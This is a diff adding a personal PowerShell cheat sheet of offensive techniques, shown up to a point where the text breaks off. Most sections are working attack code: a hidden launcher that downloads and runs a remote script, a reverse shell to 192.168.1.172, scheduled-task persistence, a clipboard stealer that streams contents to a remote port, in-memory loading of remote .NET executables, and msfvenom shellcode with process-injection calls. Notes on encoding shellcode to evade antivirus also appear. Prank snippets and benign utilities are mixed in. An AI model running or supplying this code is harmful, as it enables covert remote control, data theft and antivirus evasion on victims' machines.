@@ -1,0 +1,1065 @@
+#Powershell_trix.txt
+
+#mischief________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
+#Start
+
+#Hidden Windows (silent_EXECUTE) ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+cmd /c start /min "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File ".\script.ps1"
+
+#BUT VBS IS STILL Better or any other script
+
+Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run "powershell.exe -Sta -NoExit -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Command ""& { Invoke-RestMethod -Uri 'http://192.168.1.172/codes/Powershell_Shell/UNDE_online.ps1' -UseBasicParsing | Invoke-Expression }""", 0, False
+Set WshShell = Nothing
+
+#Task_Schedule: ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Define the script path
+$scriptPath = "C:\Users\%Username%\Documents\ExploitDEV\powershell_scripts\vbs\Simple_psh_executing.vbs"
+
+# Define the action to run the script
+$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument $scriptPath
+$action = New-ScheduledTaskAction -Execute "C:\path\to\rev.exe"
+
+# Define the trigger to run the task every 30 minutes
+$trigger = New-ScheduledTaskTrigger -AtLogOn
+$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 30) #For every 30 min
+
+# Register the scheduled task
+Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "MyTask"
+
+#Escape String with `: ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+#In powershell you sometimes want to (as an example) start another powershell instance with an spesific script without doing so manually
+
+"`$client = New-Object System.Net.Sockets.TCPClient('192.168.1.172',8080);`$stream = `$client.GetStream();[byte[]]`$bytes = 0..65535|%{0};while((`$i = `$stream.Read(`$bytes, 0, `$bytes.Length)) -ne 0){;`$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$bytes,0, `$i);`$sendback = (iex `". { `$data } 2>&1`" | Out-String ); `$sendback2 = `$sendback + 'PS ' + (pwd).Path + '> ';`$sendbyte = ([text.encoding]::ASCII).GetBytes(`$sendback2);`$stream.Write(`$sendbyte,0,`$sendbyte.Length);`$stream.Flush()};`$client.Close()"
+
+
+#Start File from USB(MYTOOL):------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+#Reson why you want that? cause maybe your script is to fat but this one isn't. So you can use it with Win+R
+powershell -command "Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 -and $_.VolumeName -eq 'MYTOOL' } | Select-Object DeviceID | ForEach-Object { Start-Process -FilePath ('{0}\MYFILE.vbs' -f $_.DeviceID) -PassThru }"
+
+#Convert a ps1 to exe using ps2exe-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+https://github.com/MScholtes/PS2EXE
+
+$ifile="rev.ps1"
+$ofile="rev.exe"
+ps2exe -inputFile $ifile -outputFile $ofile -noOutput -noError -noVisualStyles -noConsole -UNICODEEncoding
+
+#Command Executions ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+. "msg" "*" "HI"
+& "msg" "*" "HI"
+"msg * HI" | & (([String]$VerbosePreference)[1,3]+'x' -join '')
+Invoke-Expression "msg * HI"
+iex "msg * HI"
+powershell -Command "msg * HI" #There is also the option for Base64 encoded Commands called -encodedCommand
+.("msg") ("*") ("HI")
+
+#Wallpaper Change ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+$setwallpapersrc = @"
+using System.Runtime.InteropServices;
+
+public class Wallpaper
+{
+  public const int SetDesktopWallpaper = 20;
+  public const int UpdateIniFile = 0x01;
+  public const int SendWinIniChange = 0x02;
+  [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+  private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
+  public static void SetWallpaper(string path)
+  {
+    SystemParametersInfo(SetDesktopWallpaper, 0, path, UpdateIniFile | SendWinIniChange);
+  }
+}
+"@
+Add-Type -TypeDefinition $setwallpapersrc
+
+[Wallpaper]::SetWallpaper("./hacker.jpg")
+
+#Messagebox ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+msg * "hi"
+#OR
+Add-Type -AssemblyName PresentationCore,PresentationFramework
+$Result = [System.Windows.MessageBox]::Show("Gotcha","You are Hacked")
+
+#ScreenShot ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+$yourfile = ".\Screenshot.bmp"
+
+Add-Type -AssemblyName System.Windows.Forms
+Add-type -AssemblyName System.Drawing
+
+#Infos zur Aufloesung ermitteln
+$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+$Width = $Screen.Width
+$Height = $Screen.Height
+$Left = $Screen.Left
+$Top = $Screen.Top
+
+# Bitmap-Objekt mit der Aufloesung erzeugen
+$bitmap = New-Object System.Drawing.Bitmap $Width, $Height
+
+# Grafik-Objekt aus Bitmap erzeugen
+$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
+
+# Screenshot aufnehmen
+$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
+
+# Datei speichern
+$bitmap.Save($yourfile) 
+
+#Executing script from the web ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+#In RUN WIN+R
+powershell "IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/GremlinStyle/tools/main/test.ps1')"
+
+#From Web
+$response = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GremlinStyle/tools/main/test.ps1' -Method Get
+$content = $response.Content
+iex $content
+#Short
+iex (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GremlinStyle/tools/main/test.ps1' -Method Get).content
+
+#Play mp3 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+#From local file
+$MediaPlayer = [Windows.Media.Playback.MediaPlayer, Windows.Media, ContentType = WindowsRuntime]::New()
+$MediaPlayer.Source = [Windows.Media.Core.MediaSource]::CreateFromUri('C:\Users\Admin\Downloads\nyanpass.mp3')
+$MediaPlayer.Play()
+#From web 
+$MediaPlayer = [Windows.Media.Playback.MediaPlayer, Windows.Media, ContentType = WindowsRuntime]::New()
+$MediaPlayer.Source = [Windows.Media.Core.MediaSource]::CreateFromUri('https://nyanpass.com/nyanpass.mp3')
+$MediaPlayer.Play()
+
+#Speak ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+#Version 1
+$voice = New-Object -ComObject Sapi.spvoice
+# Set the speed - positive numbers are faster, negative numbers, slower
+$voice.rate = 0
+# Say something
+$voice.speak("Hey, Harcot, your BAT file is finished!")
+#Version 2
+Add-Type -AssemblyName System.Speech
+$synth = New-Object -TypeName System.Speech.Synthesis.SpeechSynthesizer
+$synth.Speak("Hey $env:USERNAME, your job is finished!")
+
+#Move Mouse / CLick -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+$Pos = [System.Windows.Forms.Cursor]::Position
+$Pos.x
+$Pos.y
+
+#Verion1
+Add-Type -AssemblyName System.Windows.Forms
+$Pos = [System.Windows.Forms.Cursor]::Position
+   $x = ($pos.X % 500) + 1
+   $y = ($pos.Y % 500) + 1
+[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x, $y)
+
+#Version 2
+Function Move-Mouse {
+
+	Param (
+        [int]$X, [int]$y
+
+    )
+
+Process {
+
+        Add-Type -AssemblyName System.Windows.Forms
+        $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+        $screen | Get-Member -MemberType Property
+        $screen.Width = $X
+        $screen.Height = $y
+        [Windows.Forms.Cursor]::Position = "$($screen.Width),$($screen.Height)"
+
+
+    }
+}
+
+Function Click-mouse {
+
+Process {
+
+        $SendMouseClick::mouse_event(0x00000002, 0, 0, 0, 0);
+        $SendMouseClick::mouse_event(0x00000004, 0, 0, 0, 0);
+
+        }
+
+}
+$Mouse=@' 
+[DllImport("user32.dll",CharSet=CharSet.Auto, CallingConvention=CallingConvention.StdCall)]
+public static extern void mouse_event(long dwFlags, long dx, long dy, long cButtons, long dwExtraInfo);
+'@ 
+$SendMouseClick = Add-Type -memberDefinition $Mouse -name "Win32MouseEventNew" -namespace Win32Functions -passThru
+Move-Mouse -x 594 -y 952
+Click-mouse
+
+#Get Clipboard ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+#Current 
+Get-Clipboard
+#Entire History
+#Only if clipboard history is enabled
+Add-Type -AssemblyName System.Runtime.WindowsRuntime
+$asTaskGeneric = ([System.WindowsRuntimeSystemExtensions].GetMethods() | ? { $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1' })[0]
+function Await($WinRtTask, $ResultType) {
+ $asTask = $asTaskGeneric.MakeGenericMethod($ResultType)
+ $netTask = $asTask.Invoke($null, @($WinRtTask))
+ $netTask.Wait(-1) | Out-Null
+ $netTask.Result
+}
+
+$null = [Windows.ApplicationModel.DataTransfer.Clipboard, Windows.ApplicationModel.DataTransfer, ContentType=WindowsRuntime]
+$op = [Windows.ApplicationModel.DataTransfer.Clipboard]::GetHistoryItemsAsync()
+
+$result = Await ($op) `
+    ([Windows.ApplicationModel.DataTransfer.ClipboardHistoryItemsResult])
+
+$textops = $result.Items.Content.GetTextAsync()
+for ($i = 0; $i -lt $textops.Count; $i++){ Await($textops[$i]) ([String]) }
+
+#Script
+while ($true) {
+    	$p = Get-Clipboard
+	$pc = [System.Convert]::ToBase64String([System.Text.Encoding]::UNICODE.GetBytes($p))
+	$pc2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UNICODE.GetBytes($pp))
+    if ($pc -ne $pc2) {
+       echo $p
+    }
+ $pp = Get-Clipboard
+ Start-Sleep 1
+}
+#Forground
+ powershell -Command "`$serverIPAddress = '192.168.1.172';`$serverPort = 4242;`$client = New-Object System.Net.Sockets.TcpClient;`$client.Connect(`$serverIPAddress, `$serverPort);`$stream = `$client.GetStream();`$pp = 'FOLLAWIRLD';while (`$true) {`$p = Get-Clipboard;`$pc=[System.Convert]::ToBase64String([System.Text.Encoding]::UNICODE.GetBytes(`$p));`$pc2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UNICODE.GetBytes(`$pp));if (`$pc -ne `$pc2) {`$bytesToSend = [System.Text.Encoding]::ASCII.GetBytes(`$p+'`n');`$stream.Write(`$bytesToSend, 0, `$bytesToSend.Length);`$stream.Flush();};`$pp = Get-Clipboard;Start-Sleep 1;}"
+#Background
+$b = {powershell -Command "`$serverIPAddress = '192.168.1.172';`$serverPort = 4242;`$client = New-Object System.Net.Sockets.TcpClient;`$client.Connect(`$serverIPAddress, `$serverPort);`$stream = `$client.GetStream();`$pp = 'FOLLAWIRLD';while (`$true) {`$p = Get-Clipboard;`$pc=[System.Convert]::ToBase64String([System.Text.Encoding]::UNICODE.GetBytes(`$p));`$pc2 = [System.Convert]::ToBase64String([System.Text.Encoding]::UNICODE.GetBytes(`$pp));if (`$pc -ne `$pc2) {`$bytesToSend = [System.Text.Encoding]::ASCII.GetBytes(`$p+'`n');`$stream.Write(`$bytesToSend, 0, `$bytesToSend.Length);`$stream.Flush();};`$pp = Get-Clipboard;Start-Sleep 1;}" }
+Start-Job -ScriptBlock $b
+
+
+#Send Key ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+#For Win Key Combination
+#https://github.com/stefanstranger/PowerShell/blob/master/WinKeys.ps1
+$source = @"
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
+
+namespace KeyboardSend
+{
+
+
+    public class KeyboardSend
+    {
+        [DllImport("user32.dll")]
+        public static extern void keybd_event(byte bVk, byte bScan, int dwFlags, int dwExtraInfo);
+
+        private const int KEYEVENTF_EXTENDEDKEY = 1;
+        private const int KEYEVENTF_KEYUP = 2;
+
+        public static void KeyDown(Keys vKey)
+        {
+            keybd_event((byte)vKey, 0, KEYEVENTF_EXTENDEDKEY, 0);
+        }
+
+        public static void KeyUp(Keys vKey)
+        {
+            keybd_event((byte)vKey, 0, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
+        }
+    }
+}
+
+"@
+
+Add-Type -TypeDefinition $source -ReferencedAssemblies "System.Windows.Forms"
+
+Function Win ($Key)
+{
+    [KeyboardSend.KeyboardSend]::KeyDown("LWin")
+    [KeyboardSend.KeyboardSend]::KeyDown("$Key")
+    [KeyboardSend.KeyboardSend]::KeyUp("LWin")
+
+}
+Win("R")
+
+
+#Normal Way but limited in what it can do
+
+#https://learn.microsoft.com/en-us/dotnet/api/system.windows.forms.sendkeys?view=windowsdesktop-8.0
+Add-Type -AssemblyName System.Windows.Forms
+
+# Send "Hello" followed by Enter key
+[System.Windows.Forms.SendKeys]::SendWait("Hello")
+[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
+
+#End
+#mischief________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
+#
+# Some useful small script to work with
+#
+#Useful________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
+#Start
+
+#Read Raw bytes from bin and print in right Format ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+#Hex
+$x=$null;[System.IO.File]::ReadAllBytes("C:\Users\$env:USERNAME\Documents\calc.bin") | ForEach-Object {$x+=$_.Tostring("X")};$x | clip
+#C
+$x=$null;[System.IO.File]::ReadAllBytes("C:\Users\$env:USERNAME\Documents\Ecalc.bin") | ForEach-Object {$x+="\x"+$_.Tostring("X")};$x | clip
+#CSHARP
+$x=$null;[System.IO.File]::ReadAllBytes("C:\Users\$env:USERNAME\Documents\calc.bin") | ForEach-Object {$x+="0x"+$_.Tostring("X")+","};$x.TRIM(",") | clip
+
+
+#Encodings/Encryption & Decoding/Decryption ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+#!!!! ONLY BASE64 IS NOT ENOUGH FOR WINDOWS 11
+
+#Here are just Base64 and AES
+
+Note add XOR & CO.
+
+    #Base64
+    #Encoding of Strings
+    [System.Convert]::ToBase64String([System.Text.Encoding]::UNICODE.GetBytes("hello")) #Needs to be turned into bytes
+    #Encoding of Bytes
+    [System.Convert]::ToBase64String(@(0x68,0x0,0x65,0x0,0x6C,0x0,0x6C,0x0,0x6F,0x0))
+    #Decoding of Strings
+    [System.Text.Encoding]::UNICODE.GetString([System.Convert]::FromBase64String(aABlAGwAbABvAA==)) #First into Bytes then from bytes to String
+    #Decoding of Bytes
+    [System.Convert]::FromBase64String(aABlAGwAbABvAA==)
+
+
+
+    #AES   
+    #Encryption 
+    #First you need an key
+    $k = New-Object Byte[] 32 
+    [Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($k) #$k is now key
+    #OR 
+    [byte[]] $k = 47,176,172,112,95,97,158,25,215,139,120,73,98,118,1,202,30,246,120,2,90,11,206,18,7,157,58,182,34,81,139,184 #just give the bytes yourself
+
+    #Actual Encryption
+    $sec = ConvertTo-SecureString -String "hello" -AsPlainText -Force
+    $encrypted = ConvertFrom-SecureString $sec -Key $k
+
+    #Decryption
+    $sec = ConvertTo-SecureString $enc -Key $k
+    $plaintext = [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($sec))
+
+    #Single Lines
+        #Encryption
+        ConvertFrom-SecureString (ConvertTo-SecureString -String "hello" -AsPlainText -Force) -Key @(47,176,172,112,95,97,158,25,215,139,120,73,98,118,1,202,30,246,120,2,90,11,206,18,7,157,58,182,34,81,139,184)
+        #Decryption
+        [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR(($sec = ConvertTo-SecureString "76492d1116743f0423413b16050a5345MgB8AHkAMQAwAEwAbgBCAGQASwBvAFoAZQBqAEcAcABlAHgANwAxAGwAMABEAHcAPQA9AHwANABhADAAOABlADQAYwAzADkAZAA0AGQANQAxADAAZgA2AGIAZgAzAGMAYQBkAGQAZgAwAGQAZQBmAGUAYQA2AA==" -Key @(47,176,172,112,95,97,158,25,215,139,120,73,98,118,1,202,30,246,120,2,90,11,206,18,7,157,58,182,34,81,139,184))))
+
+    
+    # Something i thought of due base64 encoded shellcodes from msfvenom getting detected. My thought encode each byte at one time and but them together as one string with something between each byte like here `n (same as \n but powershell)
+
+        #[Byte[]]$buf = 0x90,0x90,0x90,0x90,0x90,0x90
+
+        #Base64
+        $r=$null;$buf | ForEach-Object {$r +=  [System.Convert]::ToBase64String($_)+"`n"};$r=$r.Trim("`n");$r | clip
+        #AES
+        $r=$null;$buf | ForEach-Object {$r += (ConvertFrom-SecureString (ConvertTo-SecureString -String ([System.Convert]::ToBase64String($_)) -AsPlainText -Force) -Key $k)+"`n"};$r=$r.Trim("`n");$r | clip
+
+        #Decode Bytes
+        #Base64
+        [Byte[]]$buf2=$null;$p | ForEach-Object {$buf2 +=  [System.Convert]::FromBase64String($_)}
+        #AES
+        [Byte[]]$buf3=$null;($r -split "`n") | ForEach-Object {$buf3+=[System.Convert]::FromBase64String([System.Runtime.InteropServices.Marshal]::PtrToStringBSTR([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR((ConvertTo-SecureString $_ -Key $k))))}
+
+
+    #XOR
+    function XOREncryptDecrypt {
+    param (
+        [String]$data,
+        [String]$key
+    )
+
+    # Convert the strings to byte arrays
+    $dataBytes = [System.Text.Encoding]::UTF8.GetBytes($data)
+    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($key)
+
+    $resultBytes = @()
+
+    # Perform XOR operation
+    for ($i = 0; $i -lt $dataBytes.Length; $i++) {
+        $resultBytes += $dataBytes[$i] -bxor $keyBytes[$i % $keyBytes.Length]
+    }
+
+    # Convert the result back to a string
+    $result = [System.Text.Encoding]::UTF8.GetString($resultBytes)
+
+    return $result
+}
+
+
+#Shellcode usefull codes ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+#Byte to string
+(214).ToString("X")
+$buf[0].ToString("X")
+
+#Stringbytes to byte
+$hexString = "0xfc,0x48,0x83,0xe4"
+$h = $hexString -split ','
+[Byte[]]$byte = [byte]$h[0]
+
+#Read Raw bytes from bin and format them to 
+    #Hex
+    $x=$null;[System.IO.File]::ReadAllBytes("C:\Users\adams\Documents\Evil\bins\calc.bin") | ForEach-Object {$x+=$_.Tostring("X")};$x | clip
+    #C
+    $x=$null;[System.IO.File]::ReadAllBytes("C:\Users\adams\Documents\Evil\bins\calc.bin") | ForEach-Object {$x+="\x"+$_.Tostring("X")};$x | clip
+    #CSHARP
+    $x=$null;[System.IO.File]::ReadAllBytes("C:\Users\adams\Documents\Evil\bins\calc.bin") | ForEach-Object {$x+="0x"+$_.Tostring("X")+","};$x.TRIM(",") | clip #Cause trailing , at the end of string
+
+#Execution
+    #From msfvenom chose the output option psh (there are also other psh templates) for an finished shellcode executer
+    #Basic 1. Shellcode 2. allocate memory for shellcode 3. put shellcode into allocated memory 4.  execute at allocated memory where shellcode is
+    
+    #Example msfvenom -p windows/x64/exec CMD="calc" -f psh Exitfunc=thread
+        $kernel32func = @"
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+        "@
+        #Csharp function because powershell doesn't have them
+
+        $32funcs = Add-Type -memberDefinition $kernel32func -Name "Win32" -namespace Win32Functions -passthru
+
+        [Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0xf,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x1,0xd0,0x8b,0x80,0x88,0x0,0x0,0x0,0x48,0x85,0xc0,0x74,0x67,0x48,0x1,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x1,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x1,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x3,0x4c,0x24,0x8,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x1,0xd0,0x66,0x41,0x8b,0xc,0x48,0x44,0x8b,0x40,0x1c,0x49,0x1,0xd0,0x41,0x8b,0x4,0x88,0x48,0x1,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x48,0x8d,0x8d,0x1,0x1,0x0,0x0,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0xa,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x6,0x7c,0xa,0x80,0xfb,0xe0,0x75,0x5,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x0,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x0
+
+        $alloc = $32funcs::VirtualAlloc(0,[Math]::Max($buf.Length,0x1000),0x3000,0x40)
+
+        [System.Runtime.InteropServices.Marshal]::Copy($buf,0,$alloc,$buf.Length)
+
+        $32funcs::CreateThread(0,0,$alloc,0,0,0)
+    
+    #Alternatives for the essentials commands
+
+        #Allocate
+        $alloc = $32funcs::VirtualAlloc(0,[Math]::Max($buf.Length,0x1000),0x3000,0x40)
+        [System.Runtime.InteropServices.Marshal]::AllocHGlobal($buf)
+        $32funcs::VirtualAllocEx($processHandle, [IntPtr]::Zero, $shc.Length, 0x3000, 0x40)
+
+        #Put shellcode to allocated memory
+        [System.Runtime.InteropServices.Marshal]::Copy($buf,0,$alloc,$buf.Length)
+        for ($i = 0; $i -lt $buf.Length; $i++) {[System.Runtime.InteropServices.Marshal]::WriteByte($alloc, $i, $buf[$i])}
+        $32funcs::WriteProcessMemory($processHandle, $alloc, $buf, $buf.Length, [ref]$null) #processHandle is used in an shellcode injection techinque
+
+        #Start It
+        $32funcs::CreateThread(0,0,$alloc,0,0,0)
+        $mainth=$32funcs::GetCurrentThread();$mainFiber = $32funcs::ConvertThreadToFiber($mainth);<#Allocate and copy Shellcode#>;$fiber = $32funcs::CreateFiber([IntPtr]::Zero, $shellcodePtr, [IntPtr]::Zero);$32funcs::SwitchToFiber($fiber)
+
+    #Randomize Bytes in right Reigenfolge
+    #pratice example randShellinjectio.ps1
+
+    $shc = 1,2,3,4,5,6,7,8,9,10
+    $rar = @()  # Initialize an empty array to store the shuffled indices
+
+    for ($i = 0; $i -lt $shc.Length; $i++) {
+        while ($true) {
+            $rand = Get-Random -Minimum 0 -Maximum $shc.Length
+            if (-not $rar.Contains($rand)) {  # Check if $rand exists in $rar
+                $rar += $rand
+                Write-Host  $shc[$rand] "+" $i
+                #WriteByte $shc[$rand], $i
+                break
+            }
+        }
+    }
+
+
+#In Memory Execution of c#/dotnet programs ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+$exePath = "C:\Users\Users\source\repos\HiMsgBox\HiMsgBox\bin\Debug\HiMsgBox.exe"
+$bytes = [System.IO.File]::ReadAllBytes($exePath)
+
+$assembly = [System.Reflection.Assembly]::Load($bytes)
+#OR If exe is hosted on a server
+$assembly = [System.Reflection.Assembly]::Load([Byte[]](Invoke-WebRequest -Uri "http://192.168.1.172:9001/c#shell_start.exe" -Method Get -UseBasicParsing).Content)
+
+$entryPointMethod = $assembly.GetTypes().Where({ $_.Name -eq 'Program' }, 'First').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic')
+
+$entryPointMethod.Invoke($null, @())
+#with args Please be sure of the entryfunction and what it accepts as arg example: string[], int, etc.
+$entryPointMethod.Invoke($null, (, [string[]] ('foo', 'bar')))
+
+#Example
+$assembly = [System.Reflection.Assembly]::Load([Byte[]](Invoke-WebRequest -Uri 'http://192.168.1.172:9001/csharpinject.exe' -Method Get -UseBasicParsing).Content)
+$entryPointMethod = $assembly.GetTypes().Where({ $_.Name -eq 'Program' }, 'First').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic')
+$entryPointMethod.Invoke($null, (, [string[]] ((((Get-Process -Name 'Runtime*')[0].ID).Tostring()))))
+
+Use csharp in powershell ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Define the C# code
+$csharpCode = @"
+using System;
+public class HelloWorldPrinter {
+    public static void PrintHelloWorld() {
+        Console.WriteLine("Hello World");
+    }
+}
+"@
+# Compile the C# code
+Add-Type -TypeDefinition $csharpCode -Language CSharp
+# Call the C# method to print "Hello World"
+[HelloWorldPrinter]::PrintHelloWorld()
+
+$qdhsyoKoQsQFqNs = @"
+[DllImport("kernel32.dll")]
+public static extern IntPtr OpenProcess(UInt32 dwDesiredAccess, Boolean bInheritHandle, Int32 dwProcessId);
+[DllImport("kernel32.dll", SetLastError=true)]
+public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+[DllImport("kernel32.dll", SetLastError=true)]
+public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);
+[DllImport("kernel32.dll")]
+public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+string hello(){
+    Console.Write("hello");
+}
+"@
+
+# Add the Win32 type with the specified functions
+$win32 = Add-Type -memberDefinition $qdhsyoKoQsQFqNs -Name "Win32" -namespace Win32Functions -passthru
+$win32::OpenProcess(0x1F0FFF, $false, $pit)
+
+
+#Short Version
+Add-Type @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+public class MemoryUtils
+{
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+
+    [DllImport("kernel32.dll")]
+    public static extern bool CloseHandle(IntPtr hObject);
+
+    public const uint PROCESS_ALL_ACCESS = 0x1F0FFF;  // Full access rights to the process
+
+    public static IntPtr OpenProcess(int processId, bool inheritHandle)
+    {
+        return OpenProcess(PROCESS_ALL_ACCESS, inheritHandle, processId);
+    }
+}
+"@
+[MemoryUtils]::OpenProcess
+
+#Get PID ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+#Starting a process and get it's pid
+$pit = (Start-Process Notepad -passthru).ID
+#Get PID of {Name}
+$pit=((Get-Process -Name "*Runtime*" | Select-Object -Index 1).Id)
+
+#Get All currently loaded Functions ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+dir function:
+
+#Compression of strings ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+    #Compress
+    $ScriptString = ([Text.Encoding]::ASCII).GetBytes("hello")
+    $CompressedStream = New-Object IO.MemoryStream
+    $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
+    $DeflateStream.Write($ScriptString, 0, $ScriptString.Length)
+    $DeflateStream.Dispose()
+    $CompressedScriptBytes = $CompressedStream.ToArray()
+    $CompressedStream.Dispose()
+    $EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)
+    $EncodedCompressedScript | clip
+
+    #OneLiner UnCompress from Invoke-Obfuscation
+    (New-Object IO.Compression.DeflateStream( [IO.MemoryStream] [Convert]::FromBASE64StRing('y0jNyckHAA==')  ,[IO.Compression.CompressionMode]::Decompress) | % { New-Object System.IO.StreamReader($_ , [Text.Encoding]::ASCII )} ).ReadToEnd( ) 
+
+
+    #Beautyfied UnCompress
